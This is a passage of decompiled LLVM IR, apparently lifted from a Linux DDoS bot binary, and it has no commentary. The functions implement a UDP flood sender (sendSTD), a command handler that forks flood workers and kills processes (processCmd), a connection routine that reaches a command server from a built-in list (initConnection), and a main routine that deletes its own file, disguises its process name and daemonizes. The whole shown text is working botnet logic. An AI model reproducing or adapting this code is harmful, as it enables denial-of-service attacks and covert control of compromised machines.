  %v10_8048eb5 = icmp eq i32 %v4_8048ea9, 0
  br i1 %v10_8048eb5, label %dec_label_pc_8048eba, label %dec_label_pc_8048e67

dec_label_pc_8048eba:                             ; preds = %dec_label_pc_8048e89
  %v1_8048ea6 = add i32 %v0_8048e97, -1
  %v10_8048ec5 = icmp ult i32 %storemerge1, %v1_8048ea6
  br i1 %v10_8048ec5, label %dec_label_pc_8048e67, label %dec_label_pc_8048eca

dec_label_pc_8048eca:                             ; preds = %dec_label_pc_8048eba
  %v2_8048ed5 = mul i32 %v0_8048e97, 4
  %v5_8048ed8 = add i32 %v2_8048ed5, %v1_8048e56
  %v1_8048edb = add i32 %v5_8048ed8, -4
  store i32 %v1_8048edb, i32* @edx, align 4
  %v2_8048ee1 = inttoptr i32 %v1_8048edb to i32*
  store i32 %v1_8048e09, i32* %v2_8048ee1, align 4
  %v0_8048ee3 = load i32, i32* @global_var_8054564.18, align 4
  %v1_8048eeb = call i32 @free(i32 %v0_8048ee3)
  store i32 %v1_8048e56, i32* @global_var_8054564.18, align 4
  store i32 %v1_8048e09, i32* @ecx, align 4
  br label %dec_label_pc_8048efe

dec_label_pc_8048efe:                             ; preds = %dec_label_pc_8048e17, %dec_label_pc_8048eca
  %v2_8048f04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048f04, i32* @ebx, align 4
  ret i32 %v1_8048e09

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8048e6a, { 1, 0 }
  uselistorder i32 %v1_8048e56, { 2, 0, 1 }
  uselistorder i32 %v0_8048e22, { 1, 0 }
  uselistorder label %dec_label_pc_8048efe, { 1, 0 }
  uselistorder label %dec_label_pc_8048e89, { 1, 0 }
  uselistorder label %dec_label_pc_8048e67, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_8048f0d = add i32 %arg4, -4096
  %v6_8048f0d = sub i32 4095, %arg4
  %v7_8048f0d = and i32 %v6_8048f0d, %arg4
  %v8_8048f0d = icmp slt i32 %v7_8048f0d, 0
  %v9_8048f0d = icmp eq i32 %v4_8048f0d, 0
  %v10_8048f0d = icmp slt i32 %v4_8048f0d, 0
  %v3_8048f14 = icmp eq i1 %v10_8048f0d, %v8_8048f0d
  %v4_8048f14 = icmp eq i1 %v9_8048f0d, false
  %v5_8048f14 = and i1 %v4_8048f14, %v3_8048f14
  br i1 %v5_8048f14, label %dec_label_pc_8049090, label %dec_label_pc_8048f1a

dec_label_pc_8048f1a:                             ; preds = %entry
  %v3_8048f31 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8048f40 = call i32 @__GI_time(i32* null)
  %v1_8048f4e = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_8048f56 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_8048f77 = add i32 %v1_8048f4e, 12
  %v2_8048f77 = inttoptr i32 %v1_8048f77 to i32*
  %v3_8048f77 = load i32, i32* %v2_8048f77, align 4
  %v2_8048f7f = ptrtoint i32* %stack_var_-40 to i32
  %v1_8048f85 = add i32 %v1_8048f4e, 16
  %v2_8048f85 = inttoptr i32 %v1_8048f85 to i32*
  %v3_8048f85 = load i32, i32* %v2_8048f85, align 4
  %v1_8048f88 = inttoptr i32 %v3_8048f85 to i32*
  %v2_8048f88 = load i32, i32* %v1_8048f88, align 4
  %v3_8048f95 = call i32 @bcopy(i32 %v2_8048f88, i32 %v2_8048f7f, i32 %v3_8048f77)
  %v1_8048f9d = add i32 %v1_8048f4e, 8
  %v2_8048f9d = inttoptr i32 %v1_8048f9d to i32*
  %v3_8048f9d = load i32, i32* %v2_8048f9d, align 4
  %v1_8048fa0 = urem i32 %v3_8048f9d, 65536
  store i32 %v1_8048fa0, i32* %stack_var_-44, align 4
  %v2_8048fec = ptrtoint i32* %stack_var_-76 to i32
  %v2_8048ff9 = bitcast i32* %stack_var_-76 to i8*
  %v5_8049058 = add i32 %v2_8048f40, %arg3
  br label %dec_label_pc_8048fb8

dec_label_pc_8048fb8:                             ; preds = %dec_label_pc_8049088, %dec_label_pc_8048f1a
  %storemerge = phi i32 [ %v4_8049088, %dec_label_pc_8049088 ], [ 0, %dec_label_pc_8048f1a ]
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_8049088, label %dec_label_pc_8048fc2

dec_label_pc_8048fc2:                             ; preds = %dec_label_pc_8048fb8
  %v2_8048fc9 = call i32 @__GI_time(i32* null)
  store i32 %v2_8048fc9, i32* @eax, align 4
  %v1_8048fd1 = call i32 @srand(i32 %v2_8048fc9)
  %v0_8048fd6 = call i32 @rand_init()
  %v0_8048fdb = call i32 @rand_next()
  %v1_8048fe0 = mul i32 %v0_8048fdb, 4
  %v2_8048fe3 = and i32 %v1_8048fe0, 12
  %v1_8048fe6 = add nuw nsw i32 %v2_8048fe3, 12
  store i32 %v1_8048fe6, i32* @eax, align 4
  %v3_8048ff9 = call i32 @rand_alphastr(i8* %v2_8048ff9, i32 %v1_8048fe6)
  %v0_8049001 = load i32, i32* @ebp, align 4
  %v2_8049001 = add nsw i32 %v2_8048fe3, -60
  %v3_8049001 = add i32 %v2_8049001, %v0_8049001
  %v4_8049001 = inttoptr i32 %v3_8049001 to i8*
  store i8 0, i8* %v4_8049001, align 1
  %v4_8049028 = call i32 @__libc_send(i32 %v3_8048f31, i32 %v2_8048fec, i32 %arg4, i32 0)
  %v3_8049042 = call i32 @__libc_connect(i32 %v3_8048f31, i32 %v2_8048f56, i32 16)
  %v2_804904e = call i32 @__GI_time(i32* null)
  %v5_804905d = icmp slt i32 %v2_804904e, %v5_8049058
  br i1 %v5_804905d, label %dec_label_pc_8049088, label %dec_label_pc_804905f

dec_label_pc_804905f:                             ; preds = %dec_label_pc_8048fc2
  %v1_8049065 = call i32 @__libc_close(i32 %v3_8048f31)
  %v1_8049070 = call i32 @free(i32 %v2_8048fec)
  %v1_804907c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049088:                             ; preds = %dec_label_pc_8048fc2, %dec_label_pc_8048fb8
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_8048fb8 ], [ 0, %dec_label_pc_8048fc2 ]
  %v4_8049088 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_8048fb8

dec_label_pc_8049090:                             ; preds = %entry
  %v0_8049091 = load i32, i32* @eax, align 4
  ret i32 %v0_8049091

; uselistorder directives
  uselistorder i32 %v2_8048fe3, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v4_8048f0d, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg4, { 3, 0, 1, 2 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %tmp37 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8049095 = load i32, i32* @edi, align 4
  %v0_8049096 = load i32, i32* @esi, align 4
  %v0_8049097 = load i32, i32* @ebx, align 4
  store i32 %v0_8049097, i32* %stack_var_-16, align 4
  %v5_8049098 = icmp ult i32* %stack_var_-16, inttoptr (i32 92 to i32*)
  store i1 %v5_8049098, i1* %cf.global-to-local, align 1
  %v2_804909e = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80490b2 = inttoptr i32 %v2_804909e to i8*
  store i32 %v2_804909e, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_804ff53.19 to i32), i32* @edi, align 4
  %v7_80490bb = call i32 @_strncmp(i8* %v4_80490b2, i8* bitcast (i8** @global_var_804ff53.19 to i8*), i32 2)
  %v8_80490bb = urem i32 %v7_80490bb, 2
  %v9_80490bb = icmp eq i32 %v8_80490bb, 0
  %v0_80490bd = load i1, i1* %cf.global-to-local, align 1
  %v2_80490bd = or i1 %v0_80490bd, %v9_80490bb
  %v3_80490bd = zext i1 %v2_80490bd to i32
  %v4_80490bd = load i32, i32* @edx, align 4
  %v5_80490bd = and i32 %v4_80490bd, -256
  %v6_80490bd = or i32 %v3_80490bd, %v5_80490bd
  %v7_80490bd = xor i32 %v6_80490bd, 1
  store i32 %v7_80490bd, i32* @edx, align 4
  %v1_80490c5 = trunc i32 %v7_80490bd to i8
  %v3_80490c5 = zext i1 %v0_80490bd to i8
  %v4_80490c5 = sub nsw i8 %v1_80490c5, %v3_80490c5
  %v15_80490c5 = icmp eq i8 %v4_80490c5, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80490ce = icmp eq i1 %v15_80490c5, false
  br i1 %v1_80490ce, label %dec_label_pc_80491de, label %dec_label_pc_80490d4

dec_label_pc_80490d4:                             ; preds = %entry
  %v2_80490c9 = sext i8 %v4_80490c5 to i32
  %v9_80490d4 = icmp ult i32 %arg1, 4
  store i1 %v9_80490d4, i1* %cf.global-to-local, align 1
  %v7_80490d8 = icmp sgt i32 %arg1, 4
  br i1 %v7_80490d8, label %dec_label_pc_80490de, label %dec_label_pc_80492bb

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d4
  %v1_80490e1 = add i32 %tmp37, 4
  %v1_80490e4 = inttoptr i32 %v1_80490e1 to i32*
  %v2_80490e4 = load i32, i32* %v1_80490e4, align 4
  %v1_80490ec = add i32 %tmp37, 8
  %v5_80490ec = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_80490ec, i1* %cf.global-to-local, align 1
  %v1_80490ef = inttoptr i32 %v1_80490ec to i32*
  %v2_80490ef = load i32, i32* %v1_80490ef, align 4
  %v1_80490f4 = call i32 @atol(i32 %v2_80490ef)
  %v1_80490ff = add i32 %tmp37, 12
  %v5_80490ff = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_80490ff, i1* %cf.global-to-local, align 1
  %v1_8049102 = inttoptr i32 %v1_80490ff to i32*
  %v2_8049102 = load i32, i32* %v1_8049102, align 4
  %v1_8049107 = call i32 @atol(i32 %v2_8049102)
  %v1_8049112 = add i32 %tmp37, 16
  %v2_8049112 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_8049112, i1* %cf.global-to-local, align 1
  %v1_8049115 = inttoptr i32 %v1_8049112 to i32*
  %v2_8049115 = load i32, i32* %v1_8049115, align 4
  %v1_804911a = call i32 @atol(i32 %v2_8049115)
  %v2_8049130 = inttoptr i32 %v2_80490e4 to i8*
  %v3_8049130 = call i32 @__GI_strchr(i8* %v2_8049130, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049135 = icmp eq i32 %v3_8049130, 0
  br i1 %v1_8049135, label %dec_label_pc_80491a5, label %dec_label_pc_8049139

dec_label_pc_8049139:                             ; preds = %dec_label_pc_80490de
  store i32 %v2_80490e4, i32* @eax, align 4
  %v2_8049147 = call i32 @__GI_strtok(i32 %v2_80490e4, i32 ptrtoint (i32* @global_var_804ff55.20 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804919d4 = icmp eq i32 %v2_8049147, 0
  %v1_80491a111 = icmp eq i1 %v4_804919d4, false
  br i1 %v1_80491a111, label %dec_label_pc_8049151, label %dec_label_pc_80491de

dec_label_pc_8049151:                             ; preds = %dec_label_pc_8049139, %dec_label_pc_8049186
  %storemerge212 = phi i32 [ %v2_8049195, %dec_label_pc_8049186 ], [ %v2_8049147, %dec_label_pc_8049139 ]
  %v0_8049151 = call i32 @listFork()
  store i32 %v0_8049151, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049156 = icmp eq i32 %v0_8049151, 0
  %v1_8049158 = icmp eq i1 %v1_8049156, false
  br i1 %v1_8049158, label %dec_label_pc_8049186, label %dec_label_pc_804915a

dec_label_pc_804915a:                             ; preds = %dec_label_pc_8049151
  store i32 %storemerge212, i32* @eax, align 4
  %v4_8049175 = call i32 @sendSTD(i32 %storemerge212, i32 %v1_80490f4, i32 %v1_8049107, i32 %v1_804911a)
  %v1_8049181 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049186:                             ; preds = %dec_label_pc_8049151
  %v2_8049195 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_804ff55.20 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804919d = icmp eq i32 %v2_8049195, 0
  %v1_80491a1 = icmp eq i1 %v4_804919d, false
  br i1 %v1_80491a1, label %dec_label_pc_8049151, label %dec_label_pc_80491de

dec_label_pc_80491a5:                             ; preds = %dec_label_pc_80490de
  %v0_80491a5 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80491aa = icmp eq i32 %v0_80491a5, 0
  %v1_80491ac = icmp eq i1 %v1_80491aa, false
  br i1 %v1_80491ac, label %dec_label_pc_80492bb, label %dec_label_pc_80491b2

dec_label_pc_80491b2:                             ; preds = %dec_label_pc_80491a5
  store i32 %v2_80490e4, i32* @eax, align 4
  %v4_80491cd = call i32 @sendSTD(i32 %v2_80490e4, i32 %v1_80490f4, i32 %v1_8049107, i32 %v1_804911a)
  %v1_80491d9 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80491de:                             ; preds = %dec_label_pc_8049186, %dec_label_pc_8049139, %entry
  %v2_80491e1 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80491f5 = inttoptr i32 %v2_80491e1 to i8*
  %v7_80491fe = call i32 @_strncmp(i8* %v4_80491f5, i8* bitcast (i8** @global_var_804ff57.21 to i8*), i32 2)
  %v8_80491fe = urem i32 %v7_80491fe, 2
  %v9_80491fe = icmp eq i32 %v8_80491fe, 0
  %v0_8049200 = load i1, i1* %cf.global-to-local, align 1
  %v2_8049200 = or i1 %v0_8049200, %v9_80491fe
  %v3_8049200 = zext i1 %v2_8049200 to i8
  %v7_8049200 = xor i8 %v3_8049200, 1
  %v3_8049208 = zext i1 %v0_8049200 to i8
  %v4_8049208 = sub nsw i8 %v7_8049200, %v3_8049208
  %v15_8049208 = icmp eq i8 %v4_8049208, 0
  %v2_804920c = sext i8 %v4_8049208 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049211 = icmp eq i1 %v15_8049208, false
  br i1 %v1_8049211, label %dec_label_pc_80492bb, label %dec_label_pc_8049280

dec_label_pc_8049227:                             ; preds = %dec_label_pc_80492a7, %dec_label_pc_8049280
  %v2_804922a = mul i32 %storemerge, 4
  %v9_804922a = and i32 %storemerge, 1073741824
  %v10_804922a = icmp ne i32 %v9_804922a, 0
  %v0_804922f = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049234 = add i32 %v0_804922f, %v2_804922a
  %v1_8049237 = inttoptr i32 %v2_8049234 to i32*
  %v2_8049237 = load i32, i32* %v1_8049237, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049239 = icmp eq i32 %v2_8049237, 0
  br i1 %v1_8049239, label %dec_label_pc_804927d, label %dec_label_pc_804923d

dec_label_pc_804923d:                             ; preds = %dec_label_pc_8049227
  store i1 %v10_804922a, i1* %cf.global-to-local, align 1
  %v2_804924d = load i32, i32* %v1_8049237, align 4
  store i32 %v2_804924d, i32* @ebx, align 4
  %v0_804924f = call i32 @__libc_getpid()
  %v0_8049254 = load i32, i32* @ebx, align 4
  %v7_8049254 = icmp ult i32 %v0_8049254, %v0_804924f
  store i1 %v7_8049254, i1* %cf.global-to-local, align 1
  %v12_8049254 = icmp eq i32 %v0_8049254, %v0_804924f
  br i1 %v12_8049254, label %dec_label_pc_804927d, label %dec_label_pc_8049258

dec_label_pc_8049258:                             ; preds = %dec_label_pc_804923d
  store i1 %v10_804922a, i1* %cf.global-to-local, align 1
  %v0_8049260 = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049265 = add i32 %v0_8049260, %v2_804922a
  %v1_8049268 = inttoptr i32 %v2_8049265 to i32*
  %v2_8049268 = load i32, i32* %v1_8049268, align 4
  %v2_8049275 = call i32 @kill(i32 %v2_8049268, i32 9)
  %v4_804927a = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804927d

dec_label_pc_804927d:                             ; preds = %dec_label_pc_804923d, %dec_label_pc_8049227, %dec_label_pc_8049258
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8049227 ], [ %stack_var_-28.1, %dec_label_pc_804923d ], [ %v4_804927a, %dec_label_pc_8049258 ]
  %v4_804927d = add i32 %storemerge, 1
  br label %dec_label_pc_8049280

dec_label_pc_8049280:                             ; preds = %dec_label_pc_80491de, %dec_label_pc_804927d
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804927d ], [ 0, %dec_label_pc_80491de ]
  %storemerge = phi i32 [ %v4_804927d, %dec_label_pc_804927d ], [ 0, %dec_label_pc_80491de ]
  %v0_804928e = load i32, i32* @global_var_8052300.16, align 256
  %v0_8049293 = load i32, i32* @global_var_8052304.17, align 4
  %v10_80492a2 = icmp ne i32 %v0_8049293, 0
  store i1 %v10_80492a2, i1* %cf.global-to-local, align 1
  br i1 %v10_80492a2, label %dec_label_pc_8049227, label %dec_label_pc_80492a7

dec_label_pc_80492a7:                             ; preds = %dec_label_pc_8049280
  %v10_80492b2 = icmp ult i32 %storemerge, %v0_804928e
  store i1 %v10_80492b2, i1* %cf.global-to-local, align 1
  br i1 %v10_80492b2, label %dec_label_pc_8049227, label %dec_label_pc_80492bb

dec_label_pc_80492bb:                             ; preds = %dec_label_pc_80492a7, %dec_label_pc_80490d4, %dec_label_pc_80491de, %dec_label_pc_80491a5
  %v0_80492c2 = phi i32 [ %v2_80490c9, %dec_label_pc_80490d4 ], [ %v2_804920c, %dec_label_pc_80491de ], [ %v0_80491a5, %dec_label_pc_80491a5 ], [ %v0_804928e, %dec_label_pc_80492a7 ]
  %v0_80492bb = load i32, i32* @esp, align 4
  %v5_80492bb = icmp ugt i32 %v0_80492bb, -93
  store i1 %v5_80492bb, i1* %cf.global-to-local, align 1
  %v2_80492be = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80492be, i32* @ebx, align 4
  store i32 %v0_8049096, i32* @esi, align 4
  store i32 %v0_8049095, i32* @edi, align 4
  ret i32 %v0_80492c2

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804922a, { 1, 0 }
  uselistorder i1 %v0_8049200, { 1, 0 }
  uselistorder i32 %v2_8049195, { 1, 0 }
  uselistorder i32 %storemerge212, { 1, 0 }
  uselistorder i32 %v1_804911a, { 1, 0 }
  uselistorder i32 %v1_8049107, { 1, 0 }
  uselistorder i32 %v1_80490f4, { 1, 0 }
  uselistorder i32 %v2_80490e4, { 3, 2, 1, 0, 4 }
  uselistorder i1 %v0_80490bd, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp37, { 3, 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 8, 17, 9, 11, 10, 0, 12, 13, 14, 15, 16, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder label %dec_label_pc_80492bb, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8049280, { 1, 0 }
  uselistorder label %dec_label_pc_804927d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049151, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80492c3 = load i32, i32* @ebp, align 4
  store i32 %v0_80492c3, i32* %stack_var_-4, align 4
  %v4_80492c3 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80492c3, i32* @ebp, align 4
  %v2_80492cc = ptrtoint i32* %stack_var_-4104 to i32
  %v3_80492e8 = bitcast i32* %stack_var_-4104 to i8*
  %v4_80492e8 = call i32 @__GI_memset(i8* %v3_80492e8, i32 0, i32 4096)
  %v0_80492ed = load i32, i32* @global_var_8052308.15, align 8
  %v1_80492f2 = icmp eq i32 %v0_80492ed, 0
  br i1 %v1_80492f2, label %dec_label_pc_804930d, label %dec_label_pc_80492f6

dec_label_pc_80492f6:                             ; preds = %entry
  %v1_80492fe = call i32 @__libc_close(i32 %v0_80492ed)
  store i32 0, i32* @global_var_8052308.15, align 8
  br label %dec_label_pc_804930d

dec_label_pc_804930d:                             ; preds = %entry, %dec_label_pc_80492f6
  %v0_804930d = load i32, i32* @global_var_8052030.22, align 16
  %v1_8049312 = icmp eq i32 %v0_804930d, 0
  %v1_8049314 = icmp eq i1 %v1_8049312, false
  br i1 %v1_8049314, label %dec_label_pc_8049322, label %dec_label_pc_804932d

dec_label_pc_8049322:                             ; preds = %dec_label_pc_804930d
  %v1_8049327 = add i32 %v0_804930d, 1
  br label %dec_label_pc_804932d

dec_label_pc_804932d:                             ; preds = %dec_label_pc_804930d, %dec_label_pc_8049322
  %storemerge = phi i32 [ %v1_8049327, %dec_label_pc_8049322 ], [ 0, %dec_label_pc_804930d ]
  store i32 %storemerge, i32* @global_var_8052030.22, align 16
  %v1_8049332 = mul i32 %storemerge, 4
  %v2_8049332 = add i32 %v1_8049332, ptrtoint ([14 x i8]** @global_var_805202c.24 to i32)
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  %v4_8049332 = load i32, i32* %v3_8049332, align 4
  store i32 %v4_8049332, i32* @eax, align 4
  %v3_8049346 = call i32 @strcpy(i8* %v3_80492e8, i32 %v4_8049332)
  %v3_8049363 = call i32 @__GI_strchr(i8* %v3_80492e8, i32 58)
  %v1_8049368 = icmp eq i32 %v3_8049363, 0
  br i1 %v1_8049368, label %dec_label_pc_80493a7, label %dec_label_pc_804936c

dec_label_pc_804936c:                             ; preds = %dec_label_pc_804932d
  %v3_804937d = call i32 @__GI_strchr(i8* %v3_80492e8, i32 58)
  %v1_8049382 = add i32 %v3_804937d, 1
  %v1_8049386 = call i32 @atol(i32 %v1_8049382)
  %v3_804939f = call i32 @__GI_strchr(i8* %v3_80492e8, i32 58)
  %v4_804939f = inttoptr i32 %v3_804939f to i8*
  store i8 0, i8* %v4_804939f, align 1
  br label %dec_label_pc_80493a7

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_804932d, %dec_label_pc_804936c
  %stack_var_-8.0 = phi i32 [ 69000, %dec_label_pc_804932d ], [ %v1_8049386, %dec_label_pc_804936c ]
  %v3_80493be = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_80493be, i32* @global_var_8052308.15, align 8
  %v4_80493ea = call i32 @connectTimeout(i32 %v3_80493be, i32 %v2_80492cc, i32 %stack_var_-8.0, i32 30)
  %v1_80493ef = icmp eq i32 %v4_80493ea, 0
  %. = zext i1 %v1_80493ef to i32
  %v2_804940f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804940f, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80493a7, { 1, 0 }
  uselistorder label %dec_label_pc_804932d, { 1, 0 }
  uselistorder label %dec_label_pc_804930d, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-4400 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8049411 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8049411, i32* @ebx, align 4
  %v1_804942c = bitcast i8** %argv to i32*
  %v2_804942c = load i32, i32* %v1_804942c, align 4
  store i32 %v2_804942c, i32* %stack_var_-4400, align 4
  %v1_8049431 = call i32 @unlink(i32 %v2_804942c)
  %v0_8049436 = call i32 @rand_init()
  %v0_804943b = call i32 @rand_next()
  %v1_8049440 = mul i32 %v0_804943b, 4
  %v2_8049443 = and i32 %v1_8049440, 12
  %v1_8049446 = add nuw nsw i32 %v2_8049443, 12
  %v2_804944c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v1_8049446, i32* @eax, align 4
  store i32 %v2_804944c, i32* %stack_var_-4400, align 4
  %v2_8049459 = bitcast i32* %stack_var_-112 to i8*
  %v3_8049459 = call i32 @rand_alphastr(i8* %v2_8049459, i32 %v1_8049446)
  %v0_8049461 = load i32, i32* @ebp, align 4
  %v2_8049461 = add nsw i32 %v2_8049443, -92
  %v3_8049461 = add i32 %v2_8049461, %v0_8049461
  %v4_8049461 = inttoptr i32 %v3_8049461 to i8*
  store i8 0, i8* %v4_8049461, align 1
  %v2_8049469 = load i32, i32* %v1_804942c, align 4
  store i32 %v2_8049469, i32* %stack_var_-4400, align 4
  %v2_8049477 = call i32 @util_strcpy(i32 %v2_8049469, i32 %v2_804944c)
  %v0_804947c = call i32 @rand_next()
  %v2_8049497 = udiv i32 %v0_804947c, 6
  store i32 %v2_8049497, i32* @edi, align 4
  %tmp = mul nsw i32 %v2_8049497, -2
  %v2_80494b2 = add i32 %v0_804947c, %tmp
  %v2_80494c0 = mul i32 %v2_80494b2, 4
  %v1_80494c3 = add i32 %v2_80494c0, 12
  store i32 %v1_80494c3, i32* @eax, align 4
  store i32 %v2_804944c, i32* %stack_var_-4400, align 4
  %v3_80494d6 = call i32 @rand_alphastr(i8* %v2_8049459, i32 %v1_80494c3)
  %v0_80494de = load i32, i32* @ebp, align 4
  %v2_80494de = add i32 %v2_80494c0, -92
  %v3_80494de = add i32 %v2_80494de, %v0_80494de
  %v4_80494de = inttoptr i32 %v3_80494de to i8*
  store i8 0, i8* %v4_80494de, align 1
  store i32 15, i32* %stack_var_-4400, align 4
  %v2_80494f1 = call i32 @prctl(i32 15, i32 %v2_804944c)
  store i32 0, i32* %stack_var_-4400, align 4
  %v2_80494fd = call i32 @__GI_time(i32* null)
  store i32 %v2_80494fd, i32* @ebx, align 4
  %v0_8049504 = call i32 @__libc_getpid()
  %v1_8049509 = load i32, i32* @ebx, align 4
  %v2_8049509 = xor i32 %v1_8049509, %v0_8049504
  store i32 %v2_8049509, i32* @eax, align 4
  store i32 %v2_8049509, i32* %stack_var_-4400, align 4
  %v1_804950e = call i32 @srand(i32 %v2_8049509)
  %v0_8049513 = call i32 @rand_init()
  %v0_8049518 = load i32, i32* %stack_var_-4400, align 4
  %v1_8049518 = call i32 @__libc_fork(i32 %v0_8049518)
  %v4_8049520 = icmp eq i32 %v1_8049518, 0
  br i1 %v4_8049520, label %dec_label_pc_8049555, label %dec_label_pc_804954f.thread

dec_label_pc_804954f.thread:                      ; preds = %entry
  %v2_804952e = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v1_8049518, i32* %stack_var_-4400, align 4
  %v3_804953e = call i32 @__libc_waitpid(i32 %v1_8049518, i32 %v2_804952e, i32 0)
  store i32 %v3_804953e, i32* @eax, align 4
  store i32 0, i32* %stack_var_-4400, align 4
  %v1_804954a = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804956f

dec_label_pc_8049555:                             ; preds = %entry
  %v0_8049555 = load i32, i32* %stack_var_-4400, align 4
  %v1_8049555 = call i32 @__libc_fork(i32 %v0_8049555)
  store i32 %v1_8049555, i32* @eax, align 4
  %v4_804955d = icmp eq i32 %v1_8049555, 0
  br i1 %v4_804955d, label %dec_label_pc_804956f, label %dec_label_pc_8049563

dec_label_pc_8049563:                             ; preds = %dec_label_pc_8049555
  store i32 0, i32* %stack_var_-4400, align 4
  %v1_804956a = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804956f

dec_label_pc_804956f:                             ; preds = %dec_label_pc_804954f.thread, %dec_label_pc_8049555, %dec_label_pc_8049563
  store i32 ptrtoint (i32* @global_var_804ff59.25 to i32), i32* %stack_var_-4400, align 4
  %v1_8049576 = call i32 @chdir(i32 ptrtoint (i32* @global_var_804ff59.25 to i32))
  store i32 13, i32* %stack_var_-4400, align 4
  %v2_804958a = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_8049a3c = ptrtoint i32* %stack_var_-4284 to i32
  %v3_8049a57 = bitcast i32* %stack_var_-4284 to i8*
  %v1_80497ec = or i32 %v2_8049a3c, 1
  %v5_8049821 = inttoptr i32 %v1_80497ec to i8*
  %tmp95 = bitcast i8** %stack_var_-32 to i32*
  br label %dec_label_pc_8049591

dec_label_pc_8049591:                             ; preds = %dec_label_pc_8049591, %dec_label_pc_8049a3c, %dec_label_pc_804956f
  %v0_8049591 = call i32 @initConnection()
  %v1_8049596 = icmp eq i32 %v0_8049591, 0
  %v1_8049598 = icmp eq i1 %v1_8049596, false
  br i1 %v1_8049598, label %dec_label_pc_8049591, label %dec_label_pc_8049a3c

dec_label_pc_80495b9:                             ; preds = %dec_label_pc_80497a7, %dec_label_pc_8049760
  %v2_80495bc = mul i32 %storemerge22, 4
  %v0_80495c1 = load i32, i32* @global_var_8054564.18, align 4
  %v2_80495c6 = add i32 %v0_80495c1, %v2_80495bc
  %v1_80495c9 = inttoptr i32 %v2_80495c6 to i32*
  %v2_80495c9 = load i32, i32* %v1_80495c9, align 4
  store i32 %v2_80495c9, i32* %stack_var_-4400, align 4
